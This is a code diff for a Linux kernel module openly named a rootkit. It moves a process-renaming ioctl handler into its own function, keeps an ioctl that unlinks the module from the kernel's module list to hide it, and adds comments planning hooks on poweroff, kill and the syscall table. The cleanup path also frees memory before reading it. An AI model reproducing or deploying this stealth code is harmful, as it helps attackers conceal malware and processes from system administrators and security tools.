@@ -35,70 +35,78 @@ static int rootkit_release(struct inode *inode, struct file *filp)
 	return 0;
 }
 
+static int masq_module(unsigned long arg)
+{
+	int ret = 0;
+	int n, i;
+	struct masq_proc_req *req;
+	struct masq_proc_req __user *usr_req;
+	struct task_struct *p;
+
+	n = sizeof(struct masq_proc_req);
+	req = kmalloc(n, GFP_KERNEL);
+	usr_req = (struct masq_proc_req *)arg;
+	if (!req) {
+		ret = -ENOMEM;
+		goto masq_break;
+	}
+	if (copy_from_user(req, usr_req, n)) {
+		ret = -EFAULT;
+		goto masq_break;
+	}
+
+	n = req->len * sizeof(struct masq_proc);
+	req->list = kmalloc(n, GFP_KERNEL);
+	if (!req->list) {
+		ret = -ENOMEM;
+		goto masq_break;
+	}
+	if (copy_from_user(req->list, usr_req->list, n)) {
+		ret = -EFAULT;
+		goto masq_break;
+	}
+
+	for (i = 0; i < req->len; i++) {
+		char *orig_name, *new_name;
+		int orig_len, new_len;
+		orig_name = req->list[i].orig_name;
+		new_name = req->list[i].new_name;
+		orig_len = strlen(orig_name);
+		new_len = strlen(new_name);
+		if (new_len >= orig_len)
+			continue;
+		for_each_process(p)
+			if (strncmp(p->comm, orig_name, orig_len) == 0)
+				strncpy(p->comm, new_name, sizeof(p->comm));
+	}
+masq_break:
+	if (req)
+		kfree(req);
+	if (req->list)
+		kfree(req->list);
+	return ret;
+}
+
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 			  unsigned long arg)
 {
 	int ret = 0;
-	int n;
-	int i;
-	struct task_struct *p;
-	struct masq_proc_req *req;
-	struct masq_proc_req *usr_req;
 	pr_info("%s\n", __func__);
 
 	switch (ioctl) {
 	case IOCTL_MOD_HOOK:
+		// hook poweroff: kernel/reboot.c
+		// hook kill: kernel/signal.c: kill
 		break;
 	case IOCTL_MOD_HIDE:
 		if (THIS_MODULE->list.next || THIS_MODULE->list.prev) {
 			list_del_rcu(&THIS_MODULE->list);
 			THIS_MODULE->list.next = THIS_MODULE->list.prev = NULL;
-		} else {
+		} else
 			list_add_rcu(&THIS_MODULE->list, modules_head);
-		}
 		break;
 	case IOCTL_MOD_MASQ:
-		n = sizeof(struct masq_proc_req);
-		req = kmalloc(n, GFP_KERNEL);
-		usr_req = (struct masq_proc_req *)arg;
-		if (!req) {
-			ret = -ENOMEM;
-			goto masq_break;
-		}
-		if (copy_from_user(req, usr_req, n)) {
-			ret = -EFAULT;
-			goto masq_break;
-		}
-
-		n = req->len * sizeof(struct masq_proc);
-		req->list = kmalloc(n, GFP_KERNEL);
-		if (!req->list) {
-			ret = -ENOMEM;
-			goto masq_break;
-		}
-		if (copy_from_user(req->list, usr_req->list, n)) {
-			ret = -EFAULT;
-			goto masq_break;
-		}
-
-		for (i = 0; i < req->len; i++) {
-			char *orig_name, *new_name;
-			int orig_len, new_len;
-			orig_name = req->list[i].orig_name;
-			new_name = req->list[i].new_name;
-			orig_len = strlen(orig_name);
-			new_len = strlen(new_name);
-			if (new_len >= orig_len)
-				continue;
-			for_each_process(p)
-				if (strncmp(p->comm, orig_name, orig_len) == 0)
-					strncpy(p->comm, new_name, sizeof(p->comm));
-		}
-masq_break:
-		if (req)
-			kfree(req);
-		if (req->list)
-			kfree(req->list);
+		ret = masq_module(arg);
 		break;
 	case IOCTL_FILE_HIDE:
 		break;
@@ -146,7 +154,7 @@ static int __init rootkit_init(void)
 
 static void __exit rootkit_exit(void)
 {
-	// TODO: unhook syscall
+	// TODO: recover the syscall table when hooking the syscalls
 
 	pr_info("%s: removed\n", OURMODNAME);
 	cdev_del(kernel_cdev);
